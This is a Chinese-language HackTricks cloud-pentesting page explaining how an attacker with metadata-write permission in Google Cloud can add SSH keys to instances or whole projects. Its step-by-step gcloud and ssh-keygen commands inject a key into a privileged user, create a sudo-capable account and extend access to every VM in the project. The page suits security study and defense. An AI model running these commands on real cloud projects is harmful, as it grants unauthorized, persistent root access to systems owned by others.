# GCP - 添加自定义SSH元数据

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs收藏品](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 修改元数据 <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

如果攻击者获得必要的权限，实例上的元数据修改可能会导致**重大安全风险**。

### **将SSH密钥合并到自定义元数据中**

在GCP上，**Linux系统**通常会从[Google Compute Engine的Python Linux Guest Environment](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)执行脚本。其中一个关键组件是[accounts守护程序](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)，它旨在**定期检查**实例元数据端点，以获取**授权的SSH公钥的更新**。

因此，如果攻击者可以修改自定义元数据，他可以使守护程序找到一个新的公钥，该公钥将被处理并**集成到本地系统**中。该密钥将被添加到现有用户的`~/.ssh/authorized_keys`文件中，或者根据密钥的格式，可能会创建一个具有`sudo`权限的新用户。攻击者将能够 compromise 主机。

### **将SSH密钥添加到现有特权用户**

1. **检查实例上现有的SSH密钥：**
- 执行命令描述实例及其元数据，以查找现有的SSH密钥。输出中的相关部分将位于`metadata`下，特别是`ssh-keys`键下。
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- 注意SSH密钥的格式：用户名在冒号之前，用冒号分隔。

2. **为SSH密钥元数据准备文本文件：**
- 将用户名及其对应的SSH密钥的详细信息保存到名为`meta.txt`的文本文件中。这对于在添加新密钥时保留现有密钥至关重要。

3. **为目标用户(`alice`在此示例中)生成新的SSH密钥：**
- 使用`ssh-keygen`命令生成新的SSH密钥，确保注释字段(`-C`)与目标用户名匹配。
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- 将新的公钥添加到`meta.txt`，模仿实例元数据中找到的格式。

4. **更新实例的SSH密钥元数据：**
- 使用`gcloud compute instances add-metadata`命令将更新后的SSH密钥元数据应用于实例。
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **使用新的SSH密钥访问实例：**
- 使用新密钥连接到实例的SSH，以在目标用户(`alice`在此示例中)的上下文中访问shell。
```bash
ssh -i ./key alice@localhost
sudo id
```

### **创建一个新的特权用户并添加SSH密钥**

如果没有找到有趣的用户，可以创建一个新用户，并赋予该用户`sudo`权限：
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### 在项目级别添加SSH密钥 <a href="#sshing-around" id="sshing-around"></a>

可以通过**在项目级别应用SSH密钥**来扩大在云环境中对多个虚拟机（VMs）的SSH访问范围。这种方法允许对项目中未明确阻止项目范围SSH密钥的任何实例进行SSH访问。以下是简要指南：

1. **在项目级别应用SSH密钥：**
- 使用`gcloud compute project-info add-metadata`命令将`meta.txt`中的SSH密钥添加到项目的元数据中。此操作确保SSH密钥在项目中的所有VM中被识别，除非VM启用了“阻止项目范围SSH密钥”选项。
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **使用项目范围密钥SSH进入实例：**
- 使用项目范围SSH密钥，您可以SSH进入项目中的任何实例。未阻止项目范围密钥的实例将接受SSH密钥，从而授予访问权限。
- 直接SSH进入实例的方法是使用`gcloud compute ssh [INSTANCE]`命令。此命令使用您当前的用户名和在项目级别设置的SSH密钥尝试访问。


# 参考资料
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
